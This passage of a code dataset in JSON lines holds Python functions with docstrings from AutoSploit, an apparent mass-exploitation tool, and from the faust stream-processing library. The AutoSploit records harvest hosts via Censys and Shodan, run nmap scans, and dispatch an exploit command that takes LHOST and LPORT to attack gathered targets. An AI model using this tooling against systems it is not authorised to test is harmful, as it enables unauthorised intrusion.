"gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\ngrab a random banner each run\n\"\"\"\n", "func_signal": "def banner_main():\n", "code": "banners = [\n    banner_5, banner_4,\n    banner_3, banner_2, banner_1\n]\nif os.getenv(\"Graffiti\", False):\n    return banner_5()\nelif os.getenv(\"AutosploitOG\", False):\n    return banner_1()\nelif os.getenv(\"Nuclear\", False):\n    return banner_4()\nelif os.getenv(\"SploitaSaurusRex\", False):\n    return banner_3()\nelif os.getenv(\"Autosploit2\", False):\n    return banner_2()\nelse:\n    return random.choice(banners)()", "path": "AutoSploit/lib/banner.py", "commit_date": "2019-09-04 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nExplanation:\n------------\nReset the API tokens when needed, this will overwrite the existing\nAPI token with a provided one\n\nParameters:\n-----------\n:param api: name of the API to reset\n:param token: the token that will overwrite the current token\n:param username: if resetting Censys this will be the user ID token\n\nExamples:\n---------\nCensys ->  reset/tokens censys <token> <userID>\nShodan ->  reset.tokens shodan <token>\n\"\"\"\n", "func_signal": "def do_token_reset(self, api, token, username):\n", "code": "import sys\n\nif sys.version_info > (3,):\n    token = token.encode(\"utf-8\")\n    username = username.encode(\"utf-8\")\n\nif api.lower() == \"censys\":\n    lib.output.info(\"resetting censys API credentials\")\n    with open(lib.settings.API_KEYS[\"censys\"][0], 'w') as token_:\n        token_.write(token)\n    with open(lib.settings.API_KEYS[\"censys\"][1], 'w') as username_:\n        username_.write(username)\nelse:\n    with open(lib.settings.API_KEYS[\"shodan\"][0], 'w') as token_:\n        token_.write(token)\nlib.output.warning(\"program must be restarted for the new tokens to initialize\")", "path": "AutoSploit/lib/term/terminal.py", "commit_date": "2019-09-04 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nreflect the command memory out of the history file\n\"\"\"\n", "func_signal": "def reflect_memory(self, max_memory=100):\n", "code": "if os.path.exists(self.history_dir):\n    tmp = []\n    try:\n        with open(self.full_history_path) as history:\n            for item in history.readlines():\n                tmp.append(item.strip())\n    except:\n        pass\n    if len(tmp) == 0:\n        lib.output.warning(\"currently no history\")\n    elif len(tmp) > max_memory:\n        import shutil\n\n        history_file_backup_path = \"{}.{}.old\".format(\n            self.full_history_path,\n            lib.jsonize.random_file_name(length=12)\n        )\n        shutil.copy(self.full_history_path, history_file_backup_path)\n        os.remove(self.full_history_path)\n        open(self.full_history_path, 'a+').close()\n        lib.output.misc_info(\"history file to large, backed up under '{}'\".format(history_file_backup_path))\n    else:\n        for cmd in tmp:\n            self.history.append(cmd)", "path": "AutoSploit/lib/term/terminal.py", "commit_date": "2019-09-04 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "# idk what the fuck the problem is but this seems to fix it so...\n", "func_signal": "def terminal_main_display(self, tokens, extra_commands=None, save_history=True):\n", "code": "import lib.output\n\"\"\"\nterminal main display\n\"\"\"\nlib.output.warning(\n    \"no arguments have been parsed at run time, dropping into terminal session. \"\n    \"to get help type `help` to quit type `exit/quit` to get help on \"\n    \"a specific command type `command help`\"\n)\n\nif extra_commands is not None:\n    for command in extra_commands:\n        self.external_terminal_commands.append(command)\nself.reflect_memory()\nwhile not self.quit_terminal:\n    try:\n        lib.settings.auto_completer(self.internal_terminal_commands)\n        try:\n            choice_type, choice = self.get_choice()\n            if choice_type == \"unknown\":\n                sims = lib.settings.find_similar(\n                    choice,\n                    self.internal_terminal_commands,\n                    self.external_terminal_commands\n                )\n                if len(sims) != 0:\n                    max_sims_display = 7\n                    print(\n                        \"no command '{}' found, but there {} {} similar command{}\".format(\n                            choice,\n                            \"are\" if len(sims) > 1 else \"is\",\n                            len(sims),\n                            \"s\" if len(sims) > 1 else \"\"\n                        )\n                    )\n                    if len(sims) > max_sims_display:\n                        print(\"will only display top {} results\".format(max_sims_display))\n                    for i, cmd in enumerate(sims, start=1):\n                        if i == max_sims_display:\n                            break\n                        print(cmd)\n                    print(\"{}: command not found\".format(choice))\n                else:\n                    print(\"{} command not found\".format(choice))\n                self.history.append(choice)\n            elif choice_type == \"external\":\n                self.do_terminal_command(choice)\n                self.history.append(choice)\n            else:\n                try:\n                    choice_data_list = choice.split(\" \")\n                    if choice_data_list[-1] == \"\":\n                        choice_data_list = None\n                except:\n                    choice_data_list = None\n                if choice == \"?\" or choice == \"help\":\n                    self.do_display_usage()\n                elif any(c in choice for c in (\"external\",)):\n                    self.do_display_external()\n                elif any(c in choice for c in (\"history\", \"mem\", \"memory\")):\n                    self.do_display_history()\n                elif any(c in choice for c in (\"exit\", \"quit\")):\n                    self.do_quit_terminal(save_history=save_history)\n                elif any(c in choice for c in (\"view\", \"show\")):\n                    self.do_view_gathered()\n                elif any(c in choice for c in (\"version\",)):\n                    self.do_show_version_number()\n                elif any(c in choice for c in (\"clean\", \"clear\")):\n                    self.do_clean_hosts()\n                elif \"single\" in choice:\n                    try:\n                        if \"help\" in choice_data_list:\n                            print(self.do_load_custom_hosts.__doc__)\n                    except TypeError:\n                        pass\n                    if choice_data_list is None or len(choice_data_list) == 1:\n                        lib.output.error(\"must provide host IP after `single` keyword (IE single 89.65.78.123)\")\n                    else:\n                        self.do_add_single_host(choice_data_list[-1])\n                elif any(c in choice for c in (\"exploit\", \"run\", \"attack\")):\n                    try:\n                        if \"help\" in choice_data_list:\n                            print(self.do_exploit_targets.__doc__)\n                    except TypeError:\n                        pass\n                    if choice_data_list is None or len(choice_data_list) < 4:\n                        lib.output.error(\n                            \"must provide at least LHOST, LPORT, workspace name with `{}` keyword \"\n                            \"(IE {} 127.0.0.1 9076 default [whitelist-path] [honeycheck])\".format(\n                                choice.split(\" \")[0].strip(), choice.split(\" \")[0].strip()\n                            )\n                        )\n                    else:\n                        if lib.settings.validate_ip_addr(choice_data_list[1], home_ok=True):\n                            try:\n                                workspace = (\n                                    choice_data_list[1], choice_data_list[2],\n                                    choice_data_list[3], choice_data_list[4],\n                                    True if \"honeycheck\" in choice_data_list else False\n                                )\n                            except IndexError:\n                                workspace = (\n                                    choice_data_list[1], choice_data_list[2],\n                                    choice_data_list[3], None,\n                                    True if \"honeycheck\" in choice_data_list else False\n                                )\n                            if workspace[-1]:\n                                honeyscore = None\n                                while honeyscore is None:\n                                    honeyscore = lib.output.prompt(\n                                        \"enter the honeyscore you want as the maximum allowed\"\n                                    )\n                                    try:\n                                        honeyscore = float(honeyscore)\n                                    except:\n                                        honeyscore = None\n                                        lib.output.error(\"honey score must be a float (IE 0.3)\")\n                            self.do_exploit_targets(\n                                workspace, shodan_token=self.tokens[\"shodan\"][0]\n                            )\n                        else:\n                            lib.output.warning(\n                                \"heuristics could not validate provided IP address, \"\n                                \"did you type it right?\"\n                            )\n                elif any(c in choice for c in (\"personal\", \"custom\")):\n                    try:\n                        if \"help\" in choice_data_list:\n                            print(self.do_load_custom_hosts.__doc__)\n                    except TypeError:\n                        pass\n                    if choice_data_list is not None and len(choice_data_list) == 1:\n                        lib.output.error(\"must provide full path to file after `{}` keyword\".format(choice))\n                    else:\n                        self.do_load_custom_hosts(choice_data_list[-1])\n                elif any(c in choice for c in (\"search\", \"api\", \"gather\")):\n                    try:\n                        if \"help\" in choice_data_list:\n                            print(self.do_load_custom_hosts.__doc__)\n                    except TypeError:\n                        pass\n                    if choice_data_list is None or len(choice_data_list) < 3:\n                        lib.output.error(\n                            \"must provide a list of API names after `{}` keyword and query \"\n                            \"(IE {} shodan,censys apache2)\".format(\n                                choice.split(\" \")[0].strip(), choice.split(\" \")[0].strip()\n                            )\n                        )\n                    else:\n                        self.do_api_search(choice_data_list[1], choice_data_list[2:], tokens)\n                elif any(c in choice for c in (\"idkwhatimdoing\", \"ethics\", \"skid\")):\n                    import random\n\n                    if choice == \"ethics\" or choice == \"idkwhatimdoing\":\n                        ethics_file = \"{}/etc/text_files/ethics.lst\".format(os.getcwd())\n                        other_file = \"{}/etc/text_files/gen\".format(os.getcwd())\n                        with open(ethics_file) as ethics:\n                            ethic = random.choice(ethics.readlines()).strip()\n                            lib.output.info(\"take this ethical lesson into consideration before proceeding:\")\n                            print(\"\\n{}\\n\".format(ethic))\n                        lib.output.warning(open(other_file).read())\n                    else:\n                        lib.output.warning(\"hack to learn, don't learn to hack\")\n                elif any(c in choice for c in (\"tokens\", \"reset\")):\n                    acceptable_api_names = (\"shodan\", \"censys\")\n\n                    try:\n                        if \"help\" in choice_data_list:\n                            print(self.do_load_custom_hosts.__doc__)\n                    except TypeError:\n                        pass\n\n                    if choice_data_list is None or len(choice_data_list) < 3:\n                        lib.output.error(\n                            \"must supply API name with `{}` keyword along with \"\n                            \"new token (IE {} shodan mytoken123 [userID (censys)])\".format(\n                                choice.split(\" \")[0].strip(), choice.split(\" \")[0].strip()\n                            )\n                        )\n                    else:\n                        if choice_data_list[1].lower() in acceptable_api_names:\n                            try:\n                                api, token, username = choice_data_list[1], choice_data_list[2], choice_data_list[3]\n                            except IndexError:\n                                api, token, username = choice_data_list[1], choice_data_list[2], None\n                            self.do_token_reset(api, token, username)\n                        else:\n                            lib.output.error(\"cannot reset {} API credentials\".format(choice))\n                elif any(c in choice for c in [\"nmap\", \"mapper\", \"mappy\"]):\n                    try:\n                        if \"help\" in choice_data_list:\n                            print(self.do_nmap_scan.__doc__)\n                    except TypeError:\n                        pass\n                    target = choice_data_list[1]\n                    try:\n                        arguments = choice_data_list[2]\n                        lib.output.warning(\n                            \"arguments that have a space in them most likely will not be processed correctly, \"\n                            \"(IE --dns-servers 1.1.1.1 will most likely cause issues)\"\n                        )\n                    except IndexError:\n                        arguments = None\n                    # don't know how im going to implement ports yet\n                    # try:\n                    #     ports = choice_data_list[3]\n                    # except IndexError:\n                    #     ports = None\n                    if \"help\" not in choice_data_list:\n                        self.do_nmap_scan(target, arguments)\n                self.history.append(choice)\n                self.__reload()\n        except KeyboardInterrupt:\n            lib.output.warning(\"use the `exit/quit` command to end terminal session\")\n    except IndexError:\n        pass\n    except Exception as e:\n        global stop_animation\n\n        stop_animation = True\n\n        import sys\n        import traceback\n        import lib.creation.issue_creator\n\n        print(\n            \"\\033[31m[!] AutoSploit has hit an unhandled exception: '{}', \"\n            \"in order for the developers to troubleshoot and repair the \"\n            \"issue AutoSploit will need to gather your OS information, \"\n            \"current arguments, the error message, and a traceback. \"\n            \"None of this information can be used to identify you in any way\\033[0m\".format(str(e))\n        )\n        error_traceback = ''.join(traceback.format_tb(sys.exc_info()[2]))\n        error_class = str(e.__class__).split(\" \")[1].split(\".\")[1].strip(\">\").strip(\"'\")\n        error_file = lib.settings.save_error_to_file(str(error_traceback), str(e), error_class)\n        lib.creation.issue_creator.request_issue_creation(error_file, lib.creation.issue_creator.hide_sensitive(), str(e))\n        lib.output.info(\"continuing terminal session\")\n        # this way if you're in the terminal already we won't quit out of it\n        continue", "path": "AutoSploit/lib/term/terminal.py", "commit_date": "2019-09-04 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nview the modules that have been sorted by the relevance\nthere is a chance this will display 0 (see TODO[1])\n\"\"\"\n", "func_signal": "def view_sorted(self):\n", "code": "for mod in self.sorted_modules:\n    print(mod)", "path": "AutoSploit/lib/exploitation/exploiter.py", "commit_date": "2019-09-03 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nconnect to the Censys API and pull all IP addresses from the provided query\n\"\"\"\n", "func_signal": "def search(self):\n", "code": "discovered_censys_hosts = set()\ntry:\n    lib.settings.start_animation(\"searching Censys with given query '{}'\".format(self.query))\n    req = requests.post(\n        API_URLS[\"censys\"], auth=(self.id, self.token),\n        json={\"query\": self.query}, headers=self.user_agent,\n        proxies=self.proxy\n    )\n    json_data = req.json()\n    for item in json_data[\"results\"]:\n        discovered_censys_hosts.add(str(item[\"ip\"]))\n    write_to_file(discovered_censys_hosts, self.host_file, mode=self.save_mode)\n    return True\nexcept Exception as e:\n    raise AutoSploitAPIConnectionError(str(e))", "path": "AutoSploit/api_calls/censys.py", "commit_date": "2019-01-01 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nremove IPs from hosts list that do not appear in WHITELIST_FILE\n\"\"\"\n", "func_signal": "def whitelist_wash(hosts, whitelist_file):\n", "code": "try:\n    whitelist_hosts = [x.strip() for x in open(whitelist_file).readlines() if x.strip()]\n    lib.output.info('Found {} entries in whitelist.txt, scrubbing'.format(str(len(whitelist_hosts))))\n    washed_hosts = []\n    # return supplied hosts if whitelist file is empty\n    if len(whitelist_hosts) == 0:\n        return hosts\n    else:\n        for host in hosts:\n            if host.strip() in whitelist_hosts:\n                washed_hosts.append(host)\n\n    return washed_hosts\nexcept IOError:\n    lib.output.warning(\"unable to whitewash host list, does the file exist?\")\n    return hosts", "path": "AutoSploit/lib/exploitation/exploiter.py", "commit_date": "2019-09-03 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nquit the terminal and save the command history\n\"\"\"\n", "func_signal": "def do_quit_terminal(self, save_history=True):\n", "code": "self.quit_terminal = True\nif save_history:\n    if not os.path.exists(self.history_dir):\n        os.makedirs(self.history_dir)\n    lib.output.misc_info(\"saving history\")\n    with open(self.full_history_path, \"a+\") as hist:\n        for item in self.history:\n            hist.write(item + \"\\n\")\nlib.output.info(\"exiting terminal session\")", "path": "AutoSploit/lib/term/terminal.py", "commit_date": "2019-09-04 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nExplanation:\n------------\nAdd a single host by IP address\nOr a list of single hosts separatedd by a comma\n\nParameters:\n-----------\n:param ip: IP address to be added\n\nCommand Format:\n--------------\nsingle IP[,IP,IP,IP,IP,...]\n\nExamples:\n---------\nsingle 89.76.12.124,89.76.12.43\n\"\"\"\n", "func_signal": "def do_add_single_host(self, ip):\n", "code": "for item in ip.split(\",\"):\n    validated_ip = lib.settings.validate_ip_addr(item)\n    if not validated_ip:\n        lib.output.error(\"provided IP '{}' is invalid, try again\".format(ip))\n    else:\n        with open(lib.settings.HOST_FILE, \"a+\") as hosts:\n            hosts.write(item + \"\\n\")\n            lib.output.info(\"host '{}' saved to hosts file\".format(item))", "path": "AutoSploit/lib/term/terminal.py", "commit_date": "2019-09-04 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nExplanation:\n-----------\nPerform a nmap scan on a provided target, given that nmap is on your system.\nIf nmap is not on your system, this will not work, you may also provide\narguments known to nmap.\n\nParameters:\n----------\n:param target: the target to attack\n:param arguments: a string of arguments separated by a comma\n\nCommand Format:\n--------------\nnmap[/mapper/mappy] TARGET [ARGUMENTS]\n\nExamples:\n--------\nnmap/mapper/mappy 10.0.1.1 -sV,--dns-servers 1.1.1.1,--reason,-A\nnmap 10.0.1.1/24\n\"\"\"\n", "func_signal": "def do_nmap_scan(self, target, arguments):\n", "code": "import lib.scanner.nmap\n\nsep = \"-\" * 30\nif arguments is not None:\n    arguments = arguments.split(\",\")\n    passable_arguments = lib.scanner.nmap.parse_nmap_args(arguments)\nelse:\n    passable_arguments = None\ntry:\n    nmap_path = lib.scanner.nmap.find_nmap(lib.settings.NMAP_POSSIBLE_PATHS)\nexcept lib.errors.NmapNotFoundException:\n    nmap_path = None\n    lib.output.error(\"nmap was not found on your system please install nmap first\")\n    return\nlib.output.info(\"performing nmap scan on {}\".format(target))\ntry:\n    output, warnings, errors = lib.scanner.nmap.do_scan(target, nmap_path, arguments=passable_arguments)\n    formatted_results_output = lib.scanner.nmap.parse_xml_output(output, warnings, errors)\n    save_file = lib.scanner.nmap.write_data(target, formatted_results_output, is_xml=False)\n    lib.output.misc_info(\"JSON data dumped to file: '{}'\".format(save_file))\n    print(\"{sep}\\n{data}\\n{sep}\".format(\n        data=json.dumps(formatted_results_output[\"nmap_scan\"][target], indent=4), sep=sep\n    ))\nexcept lib.errors.NmapScannerError as e:\n    lib.output.error(str(e).strip())", "path": "AutoSploit/lib/term/terminal.py", "commit_date": "2019-09-04 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "\"\"\"\nsort modules by relevance after reading the query from the\ntemp file\n\"\"\"\n", "func_signal": "def sort_modules_by_query(self):\n", "code": "for mod in self.mods:\n    if self.query_file.strip() in mod:\n        self.sorted_modules.append(mod)\nreturn self.sorted_modules", "path": "AutoSploit/lib/exploitation/exploiter.py", "commit_date": "2019-09-03 00:00:00", "repo_name": "NullArray/AutoSploit", "stars": 4892, "license": "gpl-3.0", "language": "python", "size": 418}
{"docstring": "# we try to preserve the order of fields specified in the class,\n# so doing {**self._options.defaults, **self.__dict__} does not work.\n", "func_signal": "def _humanize(self) -> str:\n", "code": "attrs, defaults = self.__dict__, self._options.defaults.items()\nfields = {\n    **{k: v for k, v in attrs.items() if not k.startswith('__')},\n    **{k: v\n       for k, v in defaults if k not in attrs},\n}\nreturn _kvrepr(fields)", "path": "faust/faust/models/record.py", "commit_date": "2020-01-31 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Sync set contents from storage.\"\"\"\n", "func_signal": "def sync_from_storage(self) -> None:\n", "code": "for key, value in self.storage.items():\n    self[key].sync_from_storage(value)", "path": "faust/faust/tables/objects.py", "commit_date": "2019-12-06 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Draw spinner, single iteration.\"\"\"\n", "func_signal": "def update(self) -> None:\n", "code": "if not self.stopped:\n    if not self.count:\n        self.begin()\n    i = self.count % len(self.sprites)\n    self.count += 1\n    self.write(self.sprites[i])", "path": "faust/faust/utils/terminal/spinners.py", "commit_date": "2019-04-12 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Flush set contents to storage.\"\"\"\n", "func_signal": "def flush_to_storage(self) -> None:\n", "code": "for key in self._dirty:\n    self.storage[key] = self.data[key].as_stored_value()\nself._dirty.clear()", "path": "faust/faust/tables/objects.py", "commit_date": "2019-12-06 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Remove all data stored in this table.\n\nNotes:\n    Only local data will be removed, table changelog partitions\n    in Kafka will not be affected.\n\"\"\"\n", "func_signal": "def reset_state(self) -> None:\n", "code": "self._dbs.clear()\nself._key_index.clear()\nwith suppress(FileNotFoundError):\n    shutil.rmtree(self.path.absolute())", "path": "faust/faust/stores/rocksdb.py", "commit_date": "2020-05-31 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Return test metadata as mapping of HTTP/Kafka headers.\"\"\"\n", "func_signal": "def as_headers(self) -> Mapping:\n", "code": "return {\n    HEADER_TEST_ID: self.id,\n    HEADER_TEST_NAME: self.case_name,\n    HEADER_TEST_TIMESTAMP: self.timestamp.isoformat(),\n    HEADER_TEST_EXPIRES: self.expires.isoformat(),\n}", "path": "faust/faust/livecheck/models.py", "commit_date": "2019-04-09 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Underlying table storage.\"\"\"\n", "func_signal": "def data(self) -> StoreT:\n", "code": "if self._data is None:\n    self._data = self._new_store()\nreturn self._data", "path": "faust/faust/tables/base.py", "commit_date": "2020-02-27 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Prepare terminal for spinner starting.\"\"\"\n", "func_signal": "def begin(self) -> None:\n", "code": "atexit.register(type(self)._finish, self.file, at_exit=True)\nself._print(self.cursor_hide)", "path": "faust/faust/utils/terminal/spinners.py", "commit_date": "2019-04-12 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Return short identifier for this test used in logs.\"\"\"\n", "func_signal": "def shortident(self) -> str:\n", "code": "return self._build_ident(\n    self.short_case_name,\n    abbr(self.id, max=15, suffix='[...]'),\n)", "path": "faust/faust/livecheck/models.py", "commit_date": "2019-04-09 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Convert model to its Python generic counterpart.\n\nRecords will be converted to dictionary.\n\"\"\"\n# Convert known fields to mapping of ``{field: value}``.\n", "func_signal": "def to_representation(self) -> Mapping[str, Any]:\n", "code": "payload = self.asdict()\noptions = self._options\nif options.include_metadata:\n    payload['__faust'] = {'ns': options.namespace}\nreturn payload", "path": "faust/faust/models/record.py", "commit_date": "2020-01-31 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Finish spinner and reset terminal.\"\"\"\n", "func_signal": "def finish(self) -> None:\n", "code": "print(f'{self.bell * (self.width + 1)}', end='', file=self.file)\nself._finish(self.file)\nself.stop()", "path": "faust/faust/utils/terminal/spinners.py", "commit_date": "2019-04-12 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Return :class:`rocksdb.Options` object using this configuration.\"\"\"\n", "func_signal": "def as_options(self) -> Options:\n", "code": "return rocksdb.Options(\n    create_if_missing=True,\n    max_open_files=self.max_open_files,\n    write_buffer_size=self.write_buffer_size,\n    max_write_buffer_number=self.max_write_buffer_number,\n    target_file_size_base=self.target_file_size_base,\n    table_factory=rocksdb.BlockBasedTableFactory(\n        filter_policy=rocksdb.BloomFilterPolicy(\n            self.bloom_filter_size),\n        block_cache=rocksdb.LRUCache(self.block_cache_size),\n        block_cache_compressed=rocksdb.LRUCache(\n            self.block_cache_compressed_size),\n    ),\n    **self.extra_options)", "path": "faust/faust/stores/rocksdb.py", "commit_date": "2020-05-31 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Return the changelog topic used by this table.\"\"\"\n", "func_signal": "def changelog_topic(self) -> TopicT:\n", "code": "if self._changelog_topic is None:\n    self._changelog_topic = self._new_changelog_topic()\nreturn self._changelog_topic", "path": "faust/faust/tables/base.py", "commit_date": "2020-02-27 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Return table attributes as dictionary.\"\"\"\n# Used to recreate object in .clone()\n", "func_signal": "def info(self) -> Mapping[str, Any]:\n", "code": "return {\n    'app': self.app,\n    'name': self.name,\n    'default': self.default,\n    'store': self._store,\n    'schema': self.schema,\n    'key_type': self.key_type,\n    'value_type': self.value_type,\n    'partitions': self.partitions,\n    'window': self.window,\n    'changelog_topic': self._changelog_topic,\n    'recover_callbacks': self._recover_callbacks,\n    'on_changelog_event': self._on_changelog_event,\n    'recovery_buffer_size': self.recovery_buffer_size,\n    'standby_buffer_size': self.standby_buffer_size,\n    'extra_topic_configs': self.extra_topic_configs,\n    'use_partitioner': self.use_partitioner,\n}", "path": "faust/faust/tables/base.py", "commit_date": "2020-02-27 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"End test execution.\"\"\"\n", "func_signal": "def end(self) -> None:\n", "code": "self.ended = monotonic()\nself.runtime = self.ended - self.started", "path": "faust/faust/livecheck/runners.py", "commit_date": "2019-12-06 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "# generate init function that set field values from arguments,\n# and that load data from serialized form.\n#\n#\n# The general template that we will be generating is\n#\n#    def __outer__(Model):   # create __init__ closure\n#       __defaults__ = Model._options.defaults\n#       __descr__ = Model._options.descriptors\n#       {% for field in fields_with_defaults %}\n#       _default_{{ field }}_ = __defaults__[\"{{ field }}\"]\n#       {% endfor %}\n#       {% for field in fields_with_init %}\n#       _init_{{ field }}_ = __descr__[\"{{ field }}\"].to_python\n#\n#       def __init__(self, {{ sig }}, *, __strict__=True, **kwargs):\n#          self.__evaluated_fields__ = set()\n#          if __strict__:  # creating model from Python\n#              {% for field in fields %}\n#              self.{{ field }} = {{ field }}\n#              {% endfor %}\n#              if kwargs:\n#                 # raise error for additional arguments\n#          else:\n#              {% for field in fields %}\n#              {% if OPTIONAL_FIELD(field) %}\n#              if {{ field }} is not None:\n#                  self.{{ field }} = _init_{{ field }}({{ field }})\n#              else:\n#                  self.{{ field }} = _default_{{ field }}\n#              {% else %}\n#                  self.{{ field }} = _init_{{ field }}({{ field }}\n#              # any additional kwargs are added as fields\n#              # when loading from serialized data.\n#              self.__dict__.update(kwargs)\n#         self.__post_init__()\n#     return __init__\n#\n", "func_signal": "def _BUILD_init(cls) -> Callable[[], None]:\n", "code": "options = cls._options\nfield_positions = options.fieldpos\noptional = options.optionalset\nneeds_validation = options.validation\ndescriptors = options.descriptors\nhas_post_init = hasattr(cls, '__post_init__')\n\nclosures: Dict[str, str] = {\n    '__defaults__': 'Model._options.defaults',\n    '__descr__': 'Model._options.descriptors',\n}\n\nkwonlyargs = ['*', '__strict__=True', '__faust=None', '**kwargs']\n# these are sets, but we care about order as we will\n# be generating signature arguments in the correct order.\n#\n# The order is decided by the order of fields in the class):\n#\n#  class Foo(Record):\n#      c: int\n#      a: int\n#\n# becomes:\n#\n#   def __init__(self, c, a):\n#       self.c = c\n#       self.a = a\noptional_fields: Dict[str, bool] = OrderedDict()\nrequired_fields: Dict[str, bool] = OrderedDict()\n\ndef generate_setter(field: str, getval: str) -> str:\n    \"\"\"Generate code that sets attribute for field in class.\n\n    Arguments:\n        field: Name of field.\n        getval: Source code that initializes value for field,\n            can be the field name itself for no initialization\n            or for example: ``f\"self._prepare_value({field})\"``.\n        out: Destination list where new source code lines are added.\n        \"\"\"\n    if field in optional:\n        optional_fields[field] = True\n        default_var = f'_default_{field}_'\n        closures[default_var] = f'__defaults__[\"{field}\"]'\n        return (f'    self.{field} = {getval} '\n                f'if {field} is not None else {default_var}')\n    else:\n        required_fields[field] = True\n        return f'    self.{field} = {getval}'\n\ndef generate_prepare_value(field: str) -> str:\n    descriptor = descriptors[field]\n    if descriptor.lazy_coercion:\n        return field  # no initialization\n    else:\n        # call descriptor.to_python\n        init_field_var = f'_init_{field}_'\n        closures[init_field_var] = f'__descr__[\"{field}\"].to_python'\n        return f'{init_field_var}({field})'\n\npreamble = [\n    'self.__evaluated_fields__ = set()',\n]\n\ndata_setters = ['if __strict__:'] + [\n    generate_setter(field, field)\n    for field in field_positions.values()\n]\n\ndata_rest = [\n    '    if kwargs:',\n    '        from mode.utils.text import pluralize',\n    '        message = \"{} got unexpected {}: {}\".format(',\n    '            self.__class__.__name__,',\n    '            pluralize(kwargs.__len__(), \"argument\"),',\n    '            \", \".join(map(str, sorted(kwargs))))',\n    '        raise TypeError(message)',\n]\n\ninit_setters = ['else:']\nif field_positions:\n    init_setters.extend(\n        generate_setter(field, generate_prepare_value(field))\n        for field in field_positions.values()\n    )\ninit_setters.append('    self.__dict__.update(kwargs)')\n\npostamble = []\nif has_post_init:\n    postamble.append('self.__post_init__()')\nif needs_validation:\n    postamble.append('self.validate_or_raise()')\n\nsignature = list(chain(\n    ['self'],\n    [f'{field}' for field in required_fields],\n    [f'{field}=None' for field in optional_fields],\n    kwonlyargs,\n))\n\nsourcecode = codegen.build_closure_source(\n    name='__init__',\n    args=signature,\n    body=list(chain(\n        preamble,\n        data_setters,\n        data_rest,\n        init_setters,\n        postamble,\n    )),\n    closures=closures,\n    outer_args=['Model'],\n)\n\n# TIP final sourcecode also available\n# as .__sourcecode__ on returned method\n# (print(Model.__init__.__sourcecode__)\nreturn codegen.build_closure(\n    '__outer__', sourcecode, cls,\n    globals={},\n    locals={},\n)", "path": "faust/faust/models/record.py", "commit_date": "2020-01-31 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Return the :class:`faust.Model` class used by this serializer.\"\"\"\n", "func_signal": "def Model(self) -> Type[ModelT]:\n", "code": "from faust.models.base import Model\nreturn Model", "path": "faust/faust/serializers/registry.py", "commit_date": "2019-07-15 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Reset state or allow restart.\"\"\"\n", "func_signal": "def reset(self) -> None:\n", "code": "self.stopped = False\nself.count = 0", "path": "faust/faust/utils/terminal/spinners.py", "commit_date": "2019-04-12 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\"Return underlying storage used by this set table.\"\"\"\n", "func_signal": "def storage(self) -> StoreT:\n", "code": "if self._storage is None:\n    self._storage = self.table._new_store_by_url(\n        self.table._store or self.table.app.conf.store)\nreturn self._storage", "path": "faust/faust/tables/objects.py", "commit_date": "2019-12-06 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
